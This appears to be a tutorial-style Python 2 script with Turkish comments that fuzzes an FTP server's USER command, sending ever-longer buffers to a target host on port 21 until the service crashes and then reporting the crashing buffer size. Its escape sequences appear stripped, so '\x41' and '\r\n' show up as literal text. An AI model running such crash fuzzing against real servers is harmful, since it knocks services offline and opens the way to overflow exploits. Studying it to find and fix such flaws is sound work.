import sys, socket
from time import sleep
 
# Hedef servisin adresini arguman olarak aliyoruz
target = sys.argv[1]

# 50 tane A iceren bir girdi olusturuyoruz
buff = 'x41'*50
 
while True:
   # Servise durduğu zaman bunu yakalamak icin try-except kullandik
   try:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.settimeout(2)
      sock.connect((target,21))
      sock.recv(1024)
 
      print "Gonderilen buffer in boyutu: "+str(len(buff))
      # USER parametresine fuzzing yapiliyor
      sock.send("USER "+buff+"rn")
      sock.close()
      sleep(1)
      # buffer in boyutu artiriliyor
      buff = buff + 'x41'*50
   # Eger servise ulasamiyorsak, gönderdigimiz buffer in servisi durdurdugunu varsayiyoruz
   except:
      print "[+] Servisi durduran buffer in boyutu: "+str(len(buff)-50)
      sys.exit()
